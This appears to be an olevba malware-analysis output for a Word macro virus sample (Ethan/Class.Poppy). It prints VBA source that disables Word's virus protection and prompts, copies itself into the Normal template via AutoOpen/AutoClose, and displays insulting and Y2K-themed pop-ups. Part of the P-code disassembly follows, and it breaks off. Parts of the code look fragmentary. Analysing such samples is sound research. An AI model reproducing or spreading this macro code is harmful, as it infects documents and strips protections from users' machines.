olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.al
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.al - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' Open Letter to the Virus Hunters
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' This virus was written to help educate the
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' millennium bug. Please do not update your
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' until after December 1, 1999.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' I know you won't do that, but what the heck.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' I tried.
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' Bye!
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
On Error Resume Next
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
s = ActiveDocument.Saved
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Application.EnableCancelKey = Not -1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Randomize
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If Dir("c:\sys00.bak", 6) = "" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
      Print #1, a
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Close #1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
End If
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Else
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
End If
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If tf <> "" Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   If LOF(1) = 0 Then GoTo q
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Do While Not EOF(1)
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
      tf.CodeModule.InsertLines i, a
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Loop
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   Close #1
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer

'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
hh = Hour(Now): mm = Minute(Now): ss = Second(Now)
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
' only display messages for 1999
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
   GoTo end_here
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer

'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
If hh > 12 Then
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
Sub ToolsMacro()
'Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer
t$ = Chr(13) + Chr(13)

'april 1, 1999
If dd = 1 And mm = 4 Then
   Title$ = "Y2K! Spread the word"
   msg$ = "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
   msg$ = msg$ + t$ + "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
   msg$ = msg$ + t$ + "Spread the word. Knowledge is power!"
   MsgBox msg$, vbCritical, Title$
End If

'May 3, 1999
If dd = 3 And mm = 5 Then
   Title$ = "Hello again!"
   msg$ = "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'June 1, 1999
If dd = 1 And mm = 6 Then
   Title$ = "How's the weather?"
   msg$ = "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'July 2, 1999
If dd = 2 And mm = 7 Then
   Title$ = "Did you get the stove?"
   msg$ = "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'August 2, 1999
If dd = 2 And mm = 8 Then
   Title$ = "Getting back to basics"
   msg$ = "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'September 1, 1999
If dd = 1 And mm = 9 Then
   Title$ = "A Limerick"
   msg$ = "The millennium 's not far away"
   msg$ = msg$ + Chr(13) + "Get onto your coding today"
   msg$ = msg$ + Chr(13) + "Fix it or fudge it"
   msg$ = msg$ + Chr(13) + "The boss won't begrudge it"
   msg$ = msg$ + Chr(13) + "If everything works on the day!"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'October 1, 1999
If dd = 1 And mm = 10 Then
   Title$ = "Three months to go"
   msg$ = "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'November 1, 1999
If dd = 1 And mm = 11 Then
   Title$ = "Two months to go"
   msg$ = "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the ""infamous"" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'December 1, 1999
If dd = 1 And mm = 12 Then
   Title$ = "Good Luck (30 days to go)"
   msg$ = "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
   msg$ = msg$ + t$ + "Bye!"
   MsgBox msg$, vbCritical, Title$
End If

end_here:

End Sub
Sub AutoOpen()
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
On Error GoTo out
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.VirusProtection = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.SaveNormalPrompt = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Options.ConfirmConversions = False
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt > 70 And ad > 0 Then GoTo out
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt < 70 Then
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End If
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
host.CodeModule.AddFromFile ("c:\class.sys")
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
With host.CodeModule
'James Lewis17/08/99 15:25:44OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    For x = 1 To 4
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .deletelines 1
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Next x
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt < 70 Then
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    With host.CodeModule
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline 1, "Sub AutoClose()"
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline 71, "Sub ToolsMacro()"
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End If
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
With host.CodeModule
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    For x = 2 To 72 Step 2
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
    Next x
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End With
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
out:
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End Sub
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
Sub ViewVBCode()
'James Lewis17/08/99 15:25:45OKIPAGE 4w Plus on LPT1:PROCEDURE  FOR CLEANDOWNS.doc (Preview)Clippit
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.al
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 24948 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #2:
' 	QuoteRem 0x0000 0x0021 " Open Letter to the Virus Hunters"
' Line #3:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #4:
' 	QuoteRem 0x0000 0x002B " This virus was written to help educate the"
' Line #5:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #6:
' 	QuoteRem 0x0000 0x002A " millennium bug. Please do not update your"
' Line #7:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #8:
' 	QuoteRem 0x0000 0x001E " until after December 1, 1999."
' Line #9:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #10:
' 	QuoteRem 0x0000 0x002D " I know you won't do that, but what the heck."
' Line #11:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #12:
' 	QuoteRem 0x0000 0x0009 " I tried."
' Line #13:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #14:
' 	QuoteRem 0x0000 0x0005 " Bye!"
' Line #15:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #19:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #20:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #21:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #22:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #23:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #26:
' 	LitStr 0x000C "c:\sys00.bak"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #27:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #31:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #33:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #36:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'y2k"
' 	Ne 
' 	IfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #38:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'y2k"
' 	Ne 
' 	ElseIfBlock 
' Line #39:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #40:
' 	ElseBlock 
' Line #41:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #44:
' 	Ld tf 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #45:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #46:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #47:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #49:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #50:
' 	Ld i 
' 	Ld a 
' 	Ld tf 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #52:
' 	Loop 
' Line #53:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #57:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #60:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St hh 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	St mm 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	St ss 
' Line #61:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #62:
' 	QuoteRem 0x0000 0x001F " only display messages for 1999"
' Line #63:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #64:
' 	GoTo end_here 
' Line #65:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #68:
' 	Ld hh 
' 	LitDI2 0x000C 
' 	Gt 
' 	IfBlock 
' Line #69:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x0057 "Andreas Marx08.03.01 08:50:43HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAWDOC7Karl Klammer"
' Line #72:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St t$ 
' Line #73:
' Line #74:
' 	QuoteRem 0x0000 0x000D "april 1, 1999"
' Line #75:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0014 "Y2K! Spread the word"
' 	St Title$ 
' Line #77:
' 	LitStr 0x0197 "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
' 	St msg$ 
' Line #78:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0077 "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
' 	Add 
' 	St msg$ 
' Line #79:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0024 "Spread the word. Knowledge is power!"
' 	Add 
' 	St msg$ 
' Line #80:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #81:
' 	EndIfBlock 
' Line #82:
' Line #83:
' 	QuoteRem 0x0000 0x000B "May 3, 1999"
' Line #84:
' 	Ld dd 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	LitStr 0x000C "Hello again!"
' 	St Title$ 
' Line #86:
